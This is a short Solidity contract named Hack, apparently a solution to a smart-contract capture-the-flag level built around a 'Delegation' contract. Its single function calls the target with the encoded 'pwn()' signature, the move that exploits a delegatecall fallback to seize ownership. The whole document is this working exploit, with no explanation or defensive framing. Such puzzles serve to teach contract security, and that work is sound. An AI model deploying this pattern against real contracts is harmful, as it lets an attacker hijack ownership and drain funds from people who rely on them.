contract Hack{

    function hack(Delegation _add) public returns (bool) {
        (bool result, ) = address(_add).call(abi.encodeWithSignature("pwn()"));
        return result;
    }

}
